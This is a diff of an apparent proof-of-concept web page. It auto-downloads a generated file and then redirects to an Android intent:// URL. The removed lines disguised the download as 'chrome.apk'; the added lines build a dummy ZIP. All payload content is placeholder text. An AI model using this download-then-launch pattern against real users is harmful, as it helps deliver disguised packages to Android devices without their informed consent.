@@ -2,31 +2,41 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Single APK Download + Intent PoC</title>
+<title>Realistic ZIP + Intent PoC</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.11.0/jszip.min.js"></script>
 </head>
 <body>
 
-<h3>Download chrome.apk + Intent PoC</h3>
+<h3>Realistic ZIP Download + Intent PoC</h3>
 <button id="start">Start</button>
 
 <script>
-document.getElementById('start').addEventListener('click', () => {
+document.getElementById('start').addEventListener('click', async () => {
   try {
     // =========================
-    // 1. Auto-download APK
+    // 1. Buat ZIP lebih realistis
     // =========================
-    const content = "PK\nFake Chrome APK PoC\nclasses.dex\nAndroidManifest.xml\nEND";
-    const base64 = btoa(content);
-    const dataUrl = "data:application/vnd.android.package-archive;base64," + base64;
+    const zip = new JSZip();
 
+    // Tambahkan folder & file
+    zip.folder("docs").file("readme.txt", "Hello Android ZIP PoC!");
+    zip.folder("assets").file("image.png", "FakeImageContent123"); // dummy content
+    zip.file("main.txt", "Main file content");
+
+    // generate ZIP base64
+    const base64 = await zip.generateAsync({ type: "base64" });
+
+    const dataUrl = "data:application/zip;base64," + base64;
+
+    // trigger download
     const a = document.createElement('a');
     a.href = dataUrl;
-    a.download = "chrome.apk"; // nama file
-    a.click(); // trigger download sekali
-    console.log("chrome.apk download triggered");
+    a.download = "test.zip";
+    a.click();
+    console.log("Realistic test.zip download triggered");
 
     // =========================
-    // 2. Trigger Android Intent
+    // 2. Android Intent
     // =========================
     const intentUrl = 
       "intent://scan/#Intent;" +
@@ -37,11 +47,11 @@ document.getElementById('start').addEventListener('click', () => {
       ";" +
       "end";
 
-    // delay sedikit supaya download tereksekusi dulu
+    // delay supaya download tereksekusi dulu
     setTimeout(() => {
       location.href = intentUrl;
       console.log("Intent triggered");
-    }, 300);
+    }, 500);
 
   } catch (e) {
     console.error("Error:", e);
